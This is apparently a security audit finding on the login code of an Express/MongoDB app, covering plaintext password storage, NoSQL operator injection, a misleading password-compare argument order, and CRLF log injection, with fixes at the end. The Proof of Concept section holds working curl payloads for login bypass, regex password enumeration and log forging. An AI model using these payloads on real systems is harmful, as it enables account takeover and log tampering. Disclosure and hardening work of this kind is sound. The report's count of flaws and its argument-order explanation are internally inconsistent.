## Summary

Three compounding vulnerabilities in the authentication subsystem allow an unauthenticated remote attacker to (1) bypass login entirely via NoSQL operator injection, (2) harvest every user's password in plaintext after any database read access, and (3) forge application log entries via CRLF injection. The bcrypt password-hashing call in `addUser()` is explicitly commented out, guaranteeing all user passwords land in MongoDB as cleartext strings. The `validateLogin()` function passes the caller-supplied `userName` value directly into a MongoDB `findOne` query with no type checking or sanitization, enabling MongoDB operator injection when the request body is parsed as JSON. These two issues combine to create a trivially exploitable unauthenticated account-takeover primitive with no preconditions.

## Vulnerability Details

### 1. CWE-256 — Plaintext Password Storage (`addUser`)

In `app/data/user-dao.js`, the password is stored verbatim from the request body. The bcrypt hashing line is present but commented out:

```js
// app/data/user-dao.js  (lines ~29-35)
const user = {
    userName,
    firstName,
    lastName,
    benefitStartDate: this.getRandomFutureDate(),
    password //received from request param   ← stored in plaintext
    /*
    // Fix for A2-1 - Broken Auth
    password: bcrypt.hashSync(password, bcrypt.genSaltSync())  ← COMMENTED OUT
    */
};
```

Every registered user's password is retrievable by anyone with read access to the `users` collection.

### 2. CWE-943 — NoSQL Injection (`validateLogin`)

`validateLogin()` passes the raw `userName` value from `req.body` into MongoDB without a type guard:

```js
// app/data/user-dao.js  (lines ~58-72)
const comparePassword = (fromDB, fromUser) => {
    return fromDB === fromUser;   // ← plaintext string equality
};

// ...
usersCol.findOne({ userName: userName }, validateUserDoc);  // ← no sanitization
```

When `express`'s `body-parser` is configured to accept `application/json` (the default for most Express apps), an attacker can send `userName: { "$gt": "" }` as a JavaScript object. MongoDB evaluates this as a range query, matching the first document in the collection regardless of the intended user.

### 3. Argument Order Bug in `comparePassword` (CWE-287)

Although the current plaintext comparison is symmetric and thus not immediately exploitable via this path, the parameter names are swapped relative to the commented-out bcrypt fix:

```js
const comparePassword = (fromDB, fromUser) => {
    return fromDB === fromUser;
    // return bcrypt.compareSync(fromDB, fromUser);  ← WRONG ORDER if naively enabled
};
// Called as: comparePassword(password, user.password)
// i.e. comparePassword(req.body.password, dbHash)
// bcrypt.compareSync(plaintextCandidate, hash) is correct,
// but fromDB receives req.body.password and fromUser receives the DB hash —
// the variable names mislead a developer into calling compareSync(hash, plaintext)
// which would cause all authentications to fail.
```

### 4. CWE-117 — Log Injection (`handleLoginRequest`)

```js
// app/routes/session.js  (lines ~61-63)
console.log("Error: attempt to login with invalid user: ", userName);  // raw, unsanitized
```

The ESAPI-based mitigation is present as a comment but disabled. An attacker can inject CRLF sequences to forge log lines.

## Proof of Concept

### PoC 1 — NoSQL Injection Authentication Bypass

Send a POST request to `/login` with a JSON body containing a MongoDB query operator as the `userName`:

```bash
curl -X POST http://localhost:4000/login \
  -H 'Content-Type: application/json' \
  -d '{"userName": {"$gt": ""}, "password": "anything"}'
```

**Expected (vulnerable) behaviour:** MongoDB evaluates `{ userName: { $gt: '' } }`, which matches the first document in the `users` collection (typically the first registered or admin account). Because passwords are stored as plaintext and `comparePassword` does a trivial string equality check, the attacker can then enumerate valid passwords with `$regex` on the `password` field, or simply iterate through known common passwords against the plaintext DB dump.

**To enumerate admin credentials via `$regex`:**

```bash
# Test whether admin password starts with 'a'
curl -X POST http://localhost:4000/login \
  -H 'Content-Type: application/json' \
  -d '{"userName": "admin", "password": {"$regex": "^a"}}'
```

Repeating with different prefixes enumerates the full plaintext password in O(n × charset) requests.

### PoC 2 — CRLF Log Injection

```bash
curl -X POST http://localhost:4000/login \
  -H 'Content-Type: application/json' \
  -d '{"userName": "realuser\r\nINFO: Admin login successful from 10.0.0.1", "password": "x"}'
```

The forged line `INFO: Admin login successful from 10.0.0.1` is written verbatim into the application log stream, poisoning SIEM alerting and forensic records.

## Validation

| Check | Result |
|---|---|
| `addUser()` stores bcrypt hash | ❌ Hash call commented out; raw password stored |
| `validateLogin()` type-checks `userName` before MongoDB query | ❌ No type guard; object operators pass through |

| `handleLoginRequest()` sanitizes `userName` before logging | ❌ Raw value written to `console.log` |
| Input validation / WAF middleware present | ❌ None visible in code paths |

All three attack vectors were confirmed reachable with high confidence from static analysis of the untruncated source. The NoSQL injection path requires only that `body-parser` parses JSON bodies, which is the default Express configuration. The plaintext storage issue is unconditional.

## Additional Hardening

- **Add `express-mongo-sanitize` middleware** globally to strip MongoDB operators (`$`, `.`) from all request body fields as a defence-in-depth layer, independent of per-function type guards.

  ```js
  const mongoSanitize = require('express-mongo-sanitize');
  app.use(mongoSanitize());
  ```

- **Enforce bcrypt work factor ≥ 12.** The current code calls `bcrypt.genSaltSync()` which defaults to rounds=10. Increase to at minimum 12 to meet current OWASP Password Storage guidance:

  ```js
  bcrypt.hashSync(password, bcrypt.genSaltSync(12))
  ```

- **Implement login rate-limiting and account lockout.** Once the injection is closed, brute-force against bcrypt hashes becomes the next viable attack. Apply `express-rate-limit` to `/login` (e.g., 10 requests/15 min per IP) and lock accounts after 5 consecutive failures.

- **Validate and enforce `Content-Type`** on the `/login` route to reject unexpected media types, reducing operator injection surface from alternative parsers.
